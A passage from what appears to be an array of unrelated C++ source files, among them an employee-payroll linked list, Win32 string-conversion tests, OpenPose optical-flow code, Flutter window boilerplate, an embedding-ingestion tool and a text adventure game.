_sexo;\n\tedad = _edad;\n\tdireccion = _direccion;\n\ttelefono = _telefono;\n\tpuesto = _puesto;\n\tdepartamento = _departamento;\n\thorasTrabajadas = _horasTrabajadas;\n\tcostoPorHora = _costoPorHora;\n\tsueldo = _horasTrabajadas * _costoPorHora;\n\t}\n\n\t\tvoid setid(int i)\n\t{\n\t    id = i;\n\t}\n\n\tvoid setnombre(string nom)\n\t{\n\t    nombre = nom;\n\t}\n\n\tvoid setap(string ap)\n\t{\n\t    apellidoPaterno = ap;\n\t}\n\n\tvoid setam(string am)\n\t{\n\t    apellidoMaterno = am;\n\t}\n\n\tvoid setsexo(string s)\n\t{\n\t    sexo = s;\n\t}\n\n\tvoid setedad(int e)\n\t{\n\t    edad = e;\n\t}\n\n\tvoid setdireccion(string di)\n\t{\n\t    direccion = di;\n\t}\n\n\tvoid settelefono(int t)\n\t{\n\t    telefono = t;\n\t}\n\n\tvoid setpuesto(string pue)\n\t{\n\t    puesto = pue;\n\t}\n\n\tvoid setdepartamento(string dep)\n\t{\n\t    departamento = dep;\n\t}\n\n\tvoid sethoras(int h)\n\t{\n\t    horasTrabajadas = h;\n\t}\n\n\tvoid setcosto(int c)\n\t{\n\t    costoPorHora = c;\n\t}\n\n\tint get_id() const {\n\t\treturn id;\n\t}\n\n\tstring getNombre(){\n\t\treturn nombre;\n\t}\n\n\tstring getApellidoPaterno(){\n\t\treturn apellidoPaterno;\n\t}\n\n\tstring getApellidoMaterno(){\n\t\treturn apellidoMaterno;\n\t}\n\n\tstring getSexo(){\n\t\treturn sexo;\n\t}\n\n\tint getEdad(){\n\t\treturn edad;\n\t}\n\n\tstring getDireccion(){\n\t\treturn direccion;\n\t}\n\n\tint getTelefono(){\n\t\treturn telefono;\n\t}\n\n\tstring getPuesto(){\n\t\treturn puesto;\n\t}\n\n\tstring getDepartamento(){\n\t\treturn departamento;\n\t}\n\n\tint getHorasTrabajadas(){\n\t\treturn horasTrabajadas;\n\t}\n\n\tdouble getCostoPorHora(){\n\t\treturn costoPorHora;\n\t}\n\n\tdouble getSueldo(){\n\t\treturn sueldo;\n\t}\n\n};\nstruct Nodo{\n\tPersona persona;\n\tNodo* siguiente;\n\tNodo(Persona _persona) : persona(_persona), siguiente(nullptr) {}\n\n};\n//prototipado de funcines\nvoid agregar(Nodo *&, Persona);\nvoid imprimirLista(Nodo *);\nvoid eliminar(Nodo *&, int);\nvoid modificar(Nodo *&, int);\nbool esLetra(const string &str);\nNodo* buscarPorID(Nodo *,int);\nNodo* buscarPorNombre(Nodo *,string);\nbool mensaje_mostrado = false;\n\nint main(){\n\tstring nombre, apellidoPaterno, apellidoMaterno, sexo, direccion,  puesto, departamento;\n\tint id,  edad, opcionConsulta, horasTrabajadas,telefono;\n\tdouble costoPorHora;\n\tPersona persona;\n\tNodo *lista=NULL;\n\tint opc;\n\tdo{\n\t\tcout<<\"---------\u00bfQu\u00e9 deseas realizar?-------------\"<<endl;\n\t\tcout<<\"1.-Dar de alta a un empleado\"<<endl;\n\t\tcout<<\"2.-Mostrar nomina de empleado\"<<endl;\n\t\tcout<<\"3.-Dar de baja a un empleado\"<<endl;\n\t\tcout<<\"4.-Realizar cambios en la nomina\"<<endl;\n\t\tcout<<\"5.-Consultar informacion de un empleado\"<<endl;\n\t\tcout<<\"6.-Salir\"<<endl;\n\t\t///cin>>opc;\n        while (!(cin >> opc || to_string(opc).length() != 1)) {\n            if (!mensaje_mostrado) {\n                cout << \"Ingrese 1 valor numerico: \";\n                mensaje_mostrado = true;\n            }\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n\n\n\t\tswitch(opc){\n\n\t\t\tcase 1:\n\t\t\t\tcin.ignore();\n\t\t\t\tcout << \"Ingrese el ID del trabajador (6 caracteres): \";\n                while (!(cin >> id) || to_string(id).length() != 6) {\n                    if (!mensaje_mostrado) {\n                        cout << \"El ID del trabajador debe ser un n\u00famero entero de 6 d\u00edgitos. Int\u00e9ntalo de nuevo: \";;\n                        mensaje_mostrado = true;\n                    }\n                    cin.clear();\n                    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n                }\n\n    \t\t\tcin.ignore();\n\n\t\t\t\tcout << \"Ingrese el nombre del trabajador: \";\n                while (true) {\n                    getline(cin, nombre);\n                    if (!nombre.empty() && esLetra(nombre)) {\n                   ",
    "#include <Wx32/APIs.h>\n#include <stdexcept>\n\nstatic auto TestStr()\n{\n\t// mbcs to widestr\n\t{\n\t\twchar_t buffer[100]{};\n\t\tauto wide_str_buffer_sv = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), buffer, Wx32::CodePage::UTF8);\n\t\tWx32::WideStr_t wide_str_force = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), Wx32::CodePage::UTF8);\n\t\tWx32::WideStr_t wide_str_safe = Wx32::Utils::StrCvtSafe(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), Wx32::CodePage::UTF8);\n\t\tif (wide_str_force.first != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\t\tif (wide_str_safe.first != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\t\tif (wide_str_buffer_sv != L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\") { return false; }\n\n\t\ttry\n\t\t{\n\t\t\twchar_t buffer_small[2]{};\n\t\t\tauto wide_str_buffer_sm_sv = Wx32::Utils::StrCvtForce(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\"), buffer_small, Wx32::CodePage::UTF8);\n\t\t}\n\t\tcatch (const std::runtime_error& err)\n\t\t{\n\t\t\tif (::strcmp(err.what(), \"ApiStrCvt: buffer too small\"))\n\t\t\t{\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\t}\n\n\t// widestr to mbcs\n\t{\n\t\tWx32::MbcsStr_t mbc_str0_force = Wx32::Utils::StrCvtForce(L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\", Wx32::CodePage::UTF8);\n\t\tWx32::MbcsStr_t mbc_str0_safe = Wx32::Utils::StrCvtSafe(L\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\", Wx32::CodePage::UTF8);\n\t\tif (mbc_str0_force.first != Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\")) { return false; }\n\t\tif (mbc_str0_safe.first != Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5\u4e2d\u6587\")) { return false; }\n\t}\n\n\t// try error covert\n\t{\n\t\tWx32::MbcsStr_t mbcs_str = Wx32::Utils::StrCvtSafe(L\"\u8fd9\u662f\u4e00\u6bb5UTF16\u7684\u4e2d\u6587\u5b57\u7b26, \u4f46\u4f7f\u7528SJIS\u8f6c\u6362, \u80af\u5b9a\u4e22\u5931\u5b57\u7b26\", Wx32::CodePage::SJIS);\n\t\tWx32::WideStr_t wide_str = Wx32::Utils::StrCvtSafe(Wx32::Utils::ForceU8Str(u8\"\u8fd9\u662f\u4e00\u6bb5UTF8\u7684\u4e2d\u6587\u5b57\u7b26, \u4f46\u4f7f\u7528GBK\u8f6c\u6362, \u80af\u5b9a\u4f1a\u51fa\u9519\"), Wx32::CodePage::GBK);\n\t}\n\n\treturn true;\n}\n\nusing namespace Wx32;\n\nauto main() -> int\n{\n\tTestStr();\n\n\tAPI::WriteConsoleU8(API::GetStdHandle(STDHandleEnum::Output).value(), Utils::ForceU8Str(u8\"utf8\u8f93\u51fa\u6d4b\u8bd5\\n\"));\n\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u6d4b\u8bd5UTF8\u6587\u672c1\"), Utils::ForceU8Str(u8\"\u8fd9\u662fUTF8\u6587\u672c\"), MB_OK);\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u83b7\u53d6\u7a0b\u5e8f\u5f53\u524d\u76ee\u5f55\"), API::GetCurrentDirectoryU8().first.data(), MB_OK);\n\tAPI::MessageBoxU8(Utils::ForceU8Str(u8\"\u83b7\u53d6\u7a0b\u5e8f\u5f53\u524d\u8def\u5f84\"), API::GetModuleFileNameU8().first.data(), MB_OK);\n\n\tif (const auto hfile_opt = API::CreateFileU8(Utils::ForceU8Str(u8\"1.txt\"), { CREATE_ALWAYS ,(GENERIC_WRITE | GENERIC_READ), FILE_SHARE_READ }))\n\t{\n\t\tconst auto& hfile = hfile_opt.operator*();\n\n\t\tstd::string_view write_str = Utils::ForceU8Str(u8\"asjfgauifuiwf,\u6d4b\u8bd5\u5199\u5165\u8f93\u5165\");\n\t\tAPI::WriteFile(hfile, { reinterpret_cast<const uint8_t*>(write_str.data()), write_str.size() });\n\n\t\tAPI::SetFilePointerEx(hfile, 0, MoveWayEnum::Beg);\n\n\t\tstd::array<uint8_t, 33> read_buffer{};\n\t\tAPI::ReadFile(hfile, read_buffer);\n\n\t\tstd::string_view read_str = { reinterpret_cast<char*>(read_buffer.data()), read_buffer.size() - 1 };\n\t\tif (read_str == write_str)\n\t\t{\n\t\t\tAPI::WriteConsoleU8(API::GetStdHandle(STDHandleEnum::Output).value(), Utils::ForceU8Str(u8\"Equal\"));\n\t\t}\n\t}\n}",
    "#include <openpose_private/tracking/pyramidalLK.hpp>\n#ifdef WITH_SSE4\n    #include <emmintrin.h>\n    #include \"smmintrin.h\"\n#endif\n\n#ifdef WITH_AVX\n    #include <immintrin.h>\n#endif\n\n#include <iostream>\n#include <opencv2/core/core.hpp> // cv::Point2f, cv::Mat\n#include <opencv2/imgproc/imgproc.hpp> // cv::pyrDown\n#include <opencv2/video/video.hpp> // cv::buildOpticalFlowPyramid\n#include <openpose/utilities/profiler.hpp>\n\n//#define DEBUG\n// #ifdef DEBUG\n// // When debugging is enabled, these form aliases to useful functions\n// #define dbg_printf(...) printf(__VA_ARGS__);\n// #else\n// // When debugging is disabled, no code gets generated for these\n// #define dbg_printf(...)\n// #endif\n\n#define SUCCESS 0\n#define INVALID_PATCH_SIZE 1\n#define OUT_OF_FRAME 2\n#define ZERO_DENOMINATOR 3\n#define UNDEFINED_ERROR 4\n\nnamespace op\n{\n#ifdef WITH_SSE4\n    float sse_dot_product(std::vector<float> &av, std::vector<float> &bv)\n    {\n\n      /* Get SIMD-vector pointers to the start of each vector */\n      unsigned int niters = av.size() / 4;\n      float zeros[] = {0.0, 0.0, 0.0, 0.0};\n\n      float *a = (float *) aligned_alloc(16, av.size()*sizeof(float));\n      float *b = (float *) aligned_alloc(16, av.size()*sizeof(float));\n      memcpy(a,&av[0],av.size()*sizeof(float));\n      memcpy(b,&bv[0],bv.size()*sizeof(float));\n\n      __m128 *ptrA = (__m128*) &a[0], *ptrB = (__m128*) &b[0];\n      __m128 res = _mm_load_ps(zeros);\n\n      /* Do SIMD dot product */\n      for (unsigned int i = 0; i < niters; i++, ptrA++,ptrB++)\n        res = _mm_add_ps(_mm_dp_ps(*ptrA, *ptrB, 255), res);\n\n\n      /* Get result back from the SIMD vector */\n      float fres[4];\n      _mm_store_ps (fres, res);\n      int q = 4 * niters;\n\n      for (unsigned int i = 0; i < av.size() % 4; i++)\n        fres[0] += (a[i+q]*b[i+q]);\n\n      free(a);\n      free(b);\n\n      return fres[0];\n    }\n#endif\n\n// Function aligned_alloc requires C++17 in VS\n#if defined (WITH_AVX) && !defined (_WIN32)\n    float avx_dot_product(std::vector<float> &av, std::vector<float> &bv)\n    {\n        /* Get SIMD-vector pointers to the start of each vector */\n        const size_t niters = av.size() / 8;\n\n        float *a = (float *)aligned_alloc(32, av.size() * sizeof(float));\n        float *b = (float *)aligned_alloc(32, av.size() * sizeof(float));\n        memcpy(a, &av[0], av.size() * sizeof(float));\n        memcpy(b, &bv[0], bv.size() * sizeof(float));\n\n        __m256 *ptrA = (__m256*) &a[0], *ptrB = (__m256*) &b[0];\n        __m256 res = _mm256_set1_ps(0.0);\n\n        for (size_t i = 0; i < niters; i++, ptrA++, ptrB++)\n            res = _mm256_add_ps(_mm256_dp_ps(*ptrA, *ptrB, 255), res);\n\n        /* Get result back from the SIMD vector */\n        float fres[8];\n        _mm256_storeu_ps(fres, res);\n        const size_t q = 8 * niters;\n\n        for (size_t i = 0; i < av.size() % 8; i++)\n            fres[0] += (a[i + q] * b[i + q]);\n\n        free(a);\n        free(b);\n\n        return fres[0] + fres[4];\n    }\n#endif\n\n    char computeLK(cv::Point2f& delta,  std::vector<float>& ix,\n                  std::vector<float>& iy, std::vector<float>& it)\n    {\n        try\n        {\n            // Calculate sums\n#if defined (WITH_AVX) && !defined (_WIN32)\n            const float sumXX = avx_dot_product(ix,ix);\n            const float sumYY = avx_dot_product(iy,iy);\n            const float sumXY = avx_dot_product(ix,iy);\n            const float sumXT = avx_dot_product(ix,it);\n            const float sumYT = avx_dot_product(iy,it);\n#elif defined (WITH_SSE4)\n            const float sumXX = sse_dot_product(ix,ix);\n            const float sumYY = sse_dot_product(iy,iy);\n            const float sumXY = sse_dot_product(ix,iy);\n            const float sumXT = sse_dot_product(ix,it);\n            const float sumYT = sse_dot_product(iy,it);\n#else\n            auto sumXX = 0.f;\n            auto sumYY = 0.f;\n            auto sumXT = 0.f;\n            auto sumYT = 0.f;\n            auto sumXY = 0.f;\n            for (auto i = 0u; i < ix.size(); i++)\n            {\n                sumXX += ix[i] * ix[i];\n                sumYY += iy[i] * iy[i];\n                sumXY += ix[i] * iy[i];\n                sumXT += ix[i] * it[i];\n                sumYT += iy[i] * it[i];\n            }\n#endif\n\n            // Get numerator and denominator of u and v\n            const auto den = (sumXX*sumYY) - (sumXY * sumXY);\n\n            if (std::abs(den) < 1e-9f)\n                return ZERO_DENOMINATOR;\n\n            const auto numU = (-1.f * sumYY * sumXT) + (sumXY * sumYT);\n            const auto numV = (-1.f * sumXX * sumYT) + (sumXT * sumXY);\n\n            delta.x = numU / den;\n            delta.y = numV / den;\n\n            return SUCCESS;\n        }\n        catch (const std::exception& e)\n        {\n            error(e.what(), __LINE__, __FUNCTION__, __FILE__);\n            return UNDEFINED_ERROR;\n        }\n    }\n\n    void getVectors(std::vector<float>& ix, std::vector<float>& iy, std::vector<float>& it,\n                    const std::vector<std::vector<f",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff#include <iostream>\nclass arr_error : public std::exception\n{\n\tstd::string message;\npublic:\n\tarr_error(const std::string& message) : message{ message } {}\n\tconst char* what() const noexcept override\n\t{\n\t\treturn message.c_str();\n\t}\n};\nclass smart_array\n{\n\tint num_of_arr;\n\tint* arr = nullptr;\n\tint count{ 0 };\npublic:\n\tsmart_array(int c)\n\t{\n\t\tnum_of_arr = c;\n\t\tint* arr_some = new int[num_of_arr] {};\n\t\tdelete[] arr;\n\t\tarr = arr_some;\n\t}\n\t~smart_array() { delete[] arr; }\n\n\tvoid add_element(int c)\n\t{\n\t\tif (count >= num_of_arr)\n\t\t{\n\t\t\tthrow arr_error(\"Array out of bonds\");\n\t\t\treturn;\n\t\t}\n\t\tarr[count] = c;\n\t\tcount++;\n\t}\n\tint get_element(int c)\n\t{\n\t\tif (c > num_of_arr || c <= 0)\n\t\t{\n\t\t\tthrow arr_error(\"Wrong index\");\n\t\t\treturn -1 ;\n\t\t}\n\t\tc--;\n\t\treturn arr[c];\n\t}\n\tsmart_array& operator=(const smart_array& other)\n\t{\n\t\tif (this != &other)\n\t\t{\n\t\t\tdelete[] arr;\n\t\t\tnum_of_arr = other.num_of_arr;\n\t\t\tarr = new int[num_of_arr];\n\t\t\tfor(int i=0; i< num_of_arr; ++i)\n\t\t\t{\n\t\t\t\tarr[i] = other.arr[i];\n\t\t\t}\n\t\t}\n\t\treturn *this;\n\t}\n};\n\nint main()\n{\n\ttry {\n\t\tsmart_array arr(5);\n\t\tarr.add_element(1);\n\t\tarr.add_element(4);\n\t\tarr.add_element(155);\n\t\tarr.add_element(14);\n\t\tarr.add_element(15);\n\n\t\tstd::cout << arr.get_element(1) << std::endl;\n\n\t\tsmart_array new_array(2);\n\t\tnew_array.add_element(100);\n\t\tnew_array.add_element(200);\n\t\tstd::cout << new_array.get_element(1) << std::endl;\n\n\t\tarr = new_array;\n\t\tstd::cout << arr.get_element(2) << std::endl;\n\t}\n\tcatch (const std::exception& ex) {\n\t\tstd::cout << ex.what() << std::endl;\n\t}\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "///informes.cpp\n#include \"Informes.h\"\n\nvoid Informes::generarInformeGeneral(const vector<Evento*>& eventos) {\n    cout << \"Lista de eventos programados:\" << endl;\n    for (const auto& evento : eventos) {\n        cout << \"- \" << evento->getNombre() << endl;\n    }\n}\n\nvoid Informes::generarInformeDetallado(const vector<Evento*>& eventos) {\n    cout << \"Detalles de eventos y lista de asistentes:\" << endl;\n    for (const auto& evento : eventos) {\n        evento->mostrarInformacion();\n        cout << \"Asistentes:\" << endl;\n        for (const auto& asistente : evento->getAsistentes()) {\n            asistente->mostrarInformacion();\n        }\n        cout << endl;\n    }\n\n    int totalAsistentes = 0;\n    for (const auto& evento : eventos) {\n        totalAsistentes += evento->getAsistentes().size();\n    }\n    double asistenciaPromedio = totalAsistentes / static_cast<double>(eventos.size());\n\n    cout << \"Estad\u00edsticas de asistencia:\" << endl;\n    cout << \"N\u00famero total de asistentes: \" << totalAsistentes << endl;\n    cout << \"Asistencia promedio por evento: \" << asistenciaPromedio << endl;\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <execution>\n#include <cctype>\n#include <sstream>\n#include <filesystem>\n#include <vector>\n#include <nlohmann/json.hpp>\n#include \"CurlHelper.hpp\"\n#include \"text_utils.hpp\"\n#include \"skills.hpp\"\n#include \"AIClient.hpp\"\n#include \"Embedding.hpp\"\n#include \"Models/TextElement.hpp\"\n\nusing namespace std;\nnamespace fs = std::filesystem;\nusing json = nlohmann::json;\n\nauto dbName = \"/Users/armandomeabe/Code/AIBookEngine/AIBookEngine/DataBase.armDb\";\n\nstd::vector<std::string> loadTextFiles(const std::string& ruta) {\n    std::vector<std::string> fileContents;\n\n    try {\n        for (const auto& archivo : fs::directory_iterator(ruta)) {\n            if (archivo.is_regular_file()) {\n                std::ifstream ifs(archivo.path());\n                if (ifs) {\n                    std::string contenido((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());\n                    fileContents.push_back(contenido);\n                    ifs.close();\n                } else {\n                    std::cerr << \"No se pudo abrir el archivo: \" << archivo.path() << std::endl;\n                }\n            }\n        }\n    } catch (const std::exception& e) {\n        std::cerr << \"Error al recorrer la ruta: \" << e.what() << std::endl;\n    }\n\n    return fileContents;\n}\n\njson embeddingToJson(const Embedding& embedding) {\n    json j;\n    j[\"embedding\"] = embedding.embedding;\n    j[\"originalText\"] = embedding.originalText;\n    return j;\n}\n\nvoid to_json(json& j, const std::vector<Embedding>& embeddings) {\n    for (const auto& embedding : embeddings) {\n        j.push_back(embeddingToJson(embedding));\n    }\n}\n\nvoid from_json(const json& j, std::vector<Embedding>& embeddings) {\n    for (const auto& item : j) {\n        Embedding embedding;\n        embedding.embedding = item[\"embedding\"].get<std::vector<float>>();\n        embedding.originalText = item[\"originalText\"].get<std::string>();\n        embeddings.push_back(embedding);\n    }\n}\n\nstd::vector<TextElement> cargarResultadosDesdeArchivo(const std::string& nombreArchivo) {\n    std::vector<std::pair<std::vector<Embedding>, std::string>> resultados;\n    \n    std::ifstream archivo(nombreArchivo);\n    if (archivo) {\n        json j;\n        archivo >> j;\n        \n        for (const auto& resultado : j) {\n            std::vector<Embedding> embeddings = resultado[\"embeddings\"].get<std::vector<Embedding>>();\n            std::string nombreArchivo = resultado[\"nombreArchivo\"];\n            resultados.push_back(std::make_pair(embeddings, nombreArchivo));\n        }\n        \n        archivo.close();\n    } else {\n        std::cerr << \"No se pudo abrir el archivo: \" << nombreArchivo << std::endl;\n    }\n    \n    std::vector<TextElement> textElements;\n    for (auto dbItem : resultados) {\n        TextElement te(dbItem.second, dbItem.first);\n        textElements.push_back(te);\n    }\n    \n    return textElements;\n}\n\nvoid guardarResultadosEnArchivo(const std::string& nombreArchivo, const std::vector<std::pair<std::vector<Embedding>, std::string>>& resultados) {\n    std::ofstream archivo(nombreArchivo);\n    if (archivo) {\n        json j;\n        for (const auto& resultado : resultados) {\n            json jResultado;\n            jResultado[\"nombreArchivo\"] = resultado.second;\n            jResultado[\"embeddings\"] = resultado.first;\n            j.push_back(jResultado);\n        }\n\n        archivo << j.dump(4); // 4 espacios de indentaci\u00f3n para una mejor legibilidad\n        archivo.close();\n    } else {\n        std::cerr << \"No se pudo crear el archivo: \" << nombreArchivo << std::endl;\n    }\n}\n\nvoid Ingest() {\n    AIClient ai;\n    auto ingestPath = \"/Users/armandomeabe/Code/AIBookEngine/AIBookEngine/KB/booksToTextFilesSubSet/\";\n\n    std::vector<std::string> files = loadTextFiles(ingestPath);\n\n    std::vector<std::pair<std::vector<Embedding>,string>> results;\n    \n    int i = 1;\n    // Imprimir el contenido de cada archivo y comenzar el proces\n    for (const auto& file : files) {\n        i++;\n        std::cout << \"Contenido del archivo: \" << i << std::endl;\n        std::cout << file << std::endl;\n        std::cout << \"------------------------\" << std::endl;\n        \n        auto keywords = ai.Generate(file);\n        auto keywordsVector = TextUtils::splitString(keywords);\n        \n        std::vector<Embedding> embeddings;\n        for (const std::string& word : keywordsVector) {\n            auto embed = ai.Embed(word);\n            embeddings.push_back(embed);\n            std::cout << std::endl << \"Embedding palabra: \" << embed.originalText;\n        }\n        \n        results.push_back(std::make_pair(embeddings, file));\n        std::cout << std::endl << \"_________________________________________________________________\" << std::endl;\n    }\n    \n    guardarResultadosEnArchivo(dbName, results);\n}\n\nint main() {\n    AIClient ai;\n    \n//    Ingest();\n//    return 0;\n\n    auto db = cargarResultadosDesdeArchivo(dbName);\n    \n    while (true) {\n        std",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <cctype>\n#include <algorithm>\n#include <random>\n\nusing namespace std;\n\nenum en_DIRS {NORTH, EAST, SOUTH, WEST};\nenum en_ROOMS {SOUTH_MAIN_ROAD, TAVERN, ANCIENT_TREESTUMP, ADVENTURERS_GUILD, FORGE, GLOWING_POND, WINE_CELLAR, STABLES, PATH_OUT_OF_TOWN, BRIDGE, PASTURE, SIDE_ROAD, TOWN_HALL, FOUNDERS_STATUE, NORTH_MAIN_ROAD, BAKERY, FORGOTTEN_PATH, GRAVEYARD, ABANDONED_HOUSE, OVERGROWN_GARDEN, VILLAGERS_HOUSES, SMALL_VILLAGE_GARDEN, MAYORS_HOME, BROKEN_FOUNTAIN, SHOPPING_CENTER, APOTHECARY};\nenum en_VERBS {GET, DROP, USE, OPEN, CLOSE, EXAMINE, INVENTORY, LOOK, SEARCH,EXCHANGE};\nenum en_NOUNS {CELLAR_DOOR, OLD_COIN, EMPTY_ALE_BOTTLE, BASKET_OF_EGGS, DOG_BONE, NEWS_PAPER, LOST_RING, WATERING_CAN, COIN_PURSE, LOVE_POTION, FLYER, CHEESE_WHEEL, RUBY, DAGGER, COCONUT_PIECES};\n\nconst int NONE = -1;\nconst int DIRS = 4;\nconst int ROOMS = 26;\nconst int VERBS = 10;\nconst int NOUNS = 15;\n\nclass Room {\npublic:\n    string description;\n    int exits[DIRS];\n\n    Room() {}\n    \n    Room(const string& desc) : description(desc) {\n        for (int i = 0; i < DIRS; ++i) {\n            exits[i] = NONE;\n        }\n    }\n    ~Room()\n    {\n    }\n};\n\nclass Noun {\npublic:\n    string word; \n    string description;\n    int code;\n    int location;\n    bool canCarry;\n\n    Noun() {}\n    \n    Noun(const string& word_, const string& desc, int code_, int location_ = NONE, bool canCarry_ = false)\n        : word(word_), description(desc), code(code_), location(location_), canCarry(canCarry_) {}\n    ~Noun()\n    {\n    }\n};\n\nclass Word {\npublic:\n    string str;\n    int code;\n\n    Word() {}\n\n    Word(const string& str_, const int& code_)\n        :str(str_), code(code_){}\n    ~Word()\n    {\n    }\n};\n\nvoid set_rooms(vector<Room>& rooms)\n{\n    rooms.resize(ROOMS);\n    